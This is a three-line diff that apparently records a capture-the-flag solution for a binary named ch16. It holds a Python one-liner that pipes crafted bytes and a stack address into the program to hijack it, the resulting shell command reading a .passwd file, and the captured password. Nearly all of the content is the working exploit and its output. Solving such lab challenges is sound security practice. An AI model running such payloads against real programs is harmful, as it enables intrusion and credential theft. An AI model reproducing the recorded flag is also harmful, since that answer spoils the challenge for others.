@@ -1,0 +1,3 @@
+(python -c 'print "\x08"*4 + "\xbc\xfa\xff\xbf"';cat) | ./ch16
+Enter your name: cat .passwd
+Sm4shM3ify0uC4n
